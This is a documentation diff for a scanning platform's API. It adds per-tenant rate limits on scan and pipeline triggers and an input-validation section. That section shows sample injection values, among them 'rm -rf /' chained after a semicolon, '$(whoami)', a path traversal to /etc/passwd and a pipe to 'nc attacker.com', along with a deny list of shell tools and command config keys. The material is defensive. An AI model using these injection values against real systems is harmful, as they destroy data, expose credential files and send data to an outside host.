@@ -365,6 +365,10 @@ Scan configurations bind asset groups with scanners/workflows and schedules.
 | POST | `/{id}/trigger` | `scans:write` | Trigger scan execution manually |
 | POST | `/{id}/clone` | `scans:write` | Clone scan configuration |
 
+**Rate Limiting:** Trigger endpoints are rate limited per tenant:
+- `POST /{id}/trigger`: 20 requests/minute per tenant
+- `POST /quick-scan`: 10 requests/minute per tenant (stricter)
+
 ### Scan Runs (Sub-resource)
 
 **Prefix:** `/api/v1/scans/{scanId}/runs`
@@ -716,3 +720,84 @@ curl -X POST /api/v1/platform-agent/jobs/{id}/result \
 | 401 | `INVALID_JOB_TOKEN` | Job token invalid or expired |
 | 403 | `JOB_ACCESS_DENIED` | Agent not authorized for job |
 | 429 | `RATE_LIMIT_EXCEEDED` | IP banned due to auth failures |
+
+---
+
+## Rate Limiting
+
+### Trigger Endpoint Rate Limits
+
+To prevent abuse and ensure fair resource usage, trigger endpoints are rate limited per tenant:
+
+| Endpoint | Limit | Window | Scope |
+|----------|-------|--------|-------|
+| `POST /api/v1/pipelines/{id}/runs` | 30 | 1 minute | Per tenant |
+| `POST /api/v1/scans/{id}/trigger` | 20 | 1 minute | Per tenant |
+| `POST /api/v1/quick-scan` | 10 | 1 minute | Per tenant (stricter) |
+
+### Rate Limit Headers
+
+All rate-limited endpoints return standard headers:
+
+| Header | Description |
+|--------|-------------|
+| `X-RateLimit-Limit` | Maximum requests allowed in window |
+| `X-RateLimit-Remaining` | Remaining requests in current window |
+| `X-RateLimit-Reset` | Unix timestamp when limit resets |
+| `Retry-After` | Seconds to wait before retry (when limited) |
+
+### Rate Limit Response
+
+When rate limit is exceeded:
+
+```json
+{
+  "code": "RATE_LIMIT_EXCEEDED",
+  "message": "Rate limit exceeded. Please try again later.",
+  "status": 429
+}
+```
+
+---
+
+## Security Validation
+
+### Input Validation for Pipeline/Scan Operations
+
+All pipeline step configs and scan configs are validated for security before execution.
+
+### Blocked Patterns
+
+The following patterns are blocked in config values:
+
+| Category | Pattern | Example |
+|----------|---------|---------|
+| Shell metacharacters | `; & \| $ \`` | `target=example.com; rm -rf /` |
+| Command substitution | `$(...)` or backticks | `target=$(whoami)` |
+| Path traversal | `../` | `file=../../../etc/passwd` |
+| Dangerous tools | `curl`, `wget`, `nc`, `bash` | `target=\| nc attacker.com` |
+
+### Blocked Config Keys
+
+The following config keys are not allowed:
+
+```
+command, cmd, exec, execute, shell, bash, sh, script,
+eval, system, popen, subprocess, spawn, run_command,
+os_command, raw_command, custom_command
+```
+
+### Tool Validation
+
+- Tool names must exist in the tool registry
+- Capabilities must be in the allowed whitelist
+
+### Validation Error Response
+
+```json
+{
+  "code": "SECURITY_VALIDATION_FAILED",
+  "message": "Config value contains potentially dangerous pattern: command substitution",
+  "status": 400
+}
+```
